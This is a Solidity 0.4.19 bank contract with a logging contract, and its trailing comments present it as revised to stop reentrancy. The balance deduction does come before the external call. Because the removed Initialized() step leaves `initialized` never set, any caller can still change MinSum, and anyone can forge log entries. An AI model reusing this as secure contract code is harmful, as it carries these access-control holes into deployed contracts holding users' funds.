pragma solidity ^0.4.19;

contract PERSONAL_BANK {
    mapping (address => uint256) public balances;
    uint public MinSum = 1 ether;
    LogFile Log;

    bool initialized;

    function PERSONAL_BANK(address _log) public {
        Log = LogFile(_log);
    }

    function SetMinSum(uint _val) public {
        require(!initialized);
        MinSum = _val;
    }

    function Deposit() public payable {
        balances[msg.sender] += msg.value;
        Log.AddMessage(msg.sender, msg.value, "Put");
    }

    function Collect(uint _am) public {
        require(balances[msg.sender] >= MinSum && balances[msg.sender] >= _am);
        balances[msg.sender] -= _am;
        Log.AddMessage(msg.sender, _am, "Collect");
        require(msg.sender.call.value(_am)());
    }

    function() public payable {
        Deposit();
    }
}

contract LogFile {
    struct Message {
        address Sender;
        string Data;
        uint Val;
        uint Time;
    }

    Message[] public History;

    function AddMessage(address _adr, uint _val, string _data) public {
        Message memory newMessage = Message({
            Sender: _adr,
            Time: now,
            Val: _val,
            Data: _data
        });
        History.push(newMessage);
    }
} 

// Changes Made:
// 1. Removed the SetLogFile() function and passed the address of the LogFile contract in the constructor of PERSONAL_BANK contract.
// 2. Added a constructor to initialize the LogFile contract.
// 3. Removed the Initialized() function as it was not being used.
// 4. Used the require() function instead of the if() statement in the SetMinSum() and Collect() functions.
// 5. Moved the deduction of balance and logging to the LogFile contract above the external function call to prevent reentrancy attack.